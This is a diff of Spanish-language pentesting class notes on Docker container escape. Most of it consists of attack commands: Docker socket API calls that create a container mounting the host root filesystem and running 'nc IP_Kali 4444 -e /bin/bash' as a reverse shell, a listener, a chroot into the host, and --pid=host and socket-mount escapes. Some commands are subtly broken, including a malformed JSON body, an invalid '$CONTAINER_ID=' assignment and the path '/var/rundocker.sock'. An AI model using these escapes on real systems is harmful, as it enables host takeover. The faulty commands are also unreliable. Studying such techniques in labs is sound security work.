@@ -23,7 +23,7 @@ Las técnicas que se tratarán en esta clase incluyen:
 
 Estando dentro de un contenedor Docker vamos a poder escalar privilegios 'escapando' del contenedor. 
 
-## Salir del contenedor (Común)
+## Forma 1
 ```bash 
 # Se debe ser root (UID 0)
 ❯ mount    # Validar si existe algo montado a nivel de disco 
@@ -64,9 +64,65 @@ Paso 3:
 ❯ ssh root@IP     # Conectarse por SSH a la máquina víctima con la password obtenida 
 ```
 
-### Forma 1
+## Forma 2
+```bash 
+Paso 1:
+# Dentro del server con docker
+# Ejecutar como root 
+❯ curl -s --unix-socket /var/run/docker.sock http://localhost/version     
+# Muestra la salida de la API por lo que si hay conexión 
+
+NOTA:
+	- No siempre root puede ejecutarlo 
+	- Para ver el json se debe colocar el texto en una página 
+```
 
 ```bash 
+Paso 2:
+# Materializar la escapada 
+❯ curl -s --unix-socket /var/run/docker.sock http://localhost/images/json    # Ver las imagenes 
+```
+
+```bash 
+Paso 3:
+# Crear un nuevo contenedor usando nc para la revershell con la raiz del host 
+
+Forma 1:
+# Crear el contenedor 
+❯ curl -s -X POST --unix-socket /var/run/docker.sock \
+-H "Content-Type: application/json" \
+-d '{"Image":"alpine-dev","cmd":["nc","IP_Kali","4444","-e","/bin/bash"],"HostConfig:{"Binds":["/:/host"]}"}' \
+http://localhost/containers/create
+
+❯ curl -s -X POST --unix-socket /var/run/docker.sock http://localhost/containers/ID/start  # Levantar el contenedor
+	# ID = Es el ID del resultado del primer comando 
+
+
+Forma 2: (Mejor opción)
+# Crear el contenedor 
+❯ $CONTAINER_ID=$(curl -s -X POST --unix-socket /var/run/docker.sock \
+-H "Content-Type: application/json" \
+-d '{"Image":"alpine-dev","cmd":["nc","IP_Kali","4444","-e","/bin/bash"],"HostConfig:{"Binds":["/:/host"]}"}' \
+http://localhost/containers/create | grep -o '"Id":"[^"]*' | cut -d'"' -f4
+)  
+
+❯ curl -s -X POST --unix-socket /var/run/docker.sock http://localhost/containers/$CONTAINER_ID/start  # Levantar el contenedor 
+```
+
+```bash 
+Paso 4:
+❯ rlwrap nc -nlvp 4444    # Recibir la revershell 
+
+Paso 5:
+# Una vez obtenida la revershell hacer lo siguiente:
+❯ chroot /host /bin/bash 
+	❯ id 
+	❯ cat /etc/hostname 
+```
+
+## Forma 3
+```bash 
+Si no se tiene una imagen, cargar una al server 
 ❯ docker run --rm -dit -v /var/run/docker.sock:/var/rundocker.sock --name ubuntuServer ubuntu  # Nos crearemos un contenedor 1 de la imagen descargada anteriormente llamada 'ubuntuServer' y le diremos que queremos que el 'docker.sock' de la maquina victima nos lo copie en la misma ruta del contenedor
 
 ❯ docker exec -it ubuntuServer bash        # Ingresamos al contenedor 'ubuntuServer' por medio de una bash como root
@@ -77,8 +133,7 @@ Paso 3:
 	❯ docker exec -it privesc bash        # Ingresar al contenedor 'privesc' y ahi podremos darle permisos SUID a la bash, por lo que se vera reflejada en la maquina host
 ```
 
-### Forma 2
-
+## Forma 4
 ```bash 
 ❯ docker run --rm -dit --pid=host --name ubuntuServer ubuntu  # Nos crearemos un contenedor de una imagen antes descargada, pid = Hacer que los procesos de la maquina host los podamos ver y podamos interactuar con ellos dentro del contenedor 
 ❯ docker exec -it ubuntuServer bash        # Ingresamos al contenedor 'ubuntuServer' por medio de una bash como root
@@ -215,7 +270,7 @@ main (int argc, char *argv[])
 ❯ nc 172.17.0.1 5600    # Obtener la revershell como root        
 ```
 
-### Forma 3 
+## Forma 5 
 
 Portainer: Es una herramienta web open-source que permite gestionar contenedores Docker. Permite administrar contenedores de forma remota o local, la infraestructura de soporte y todos los aspectos de las implementaciones de Kubernetes, Docker standalone y Docker Swarm. 
 
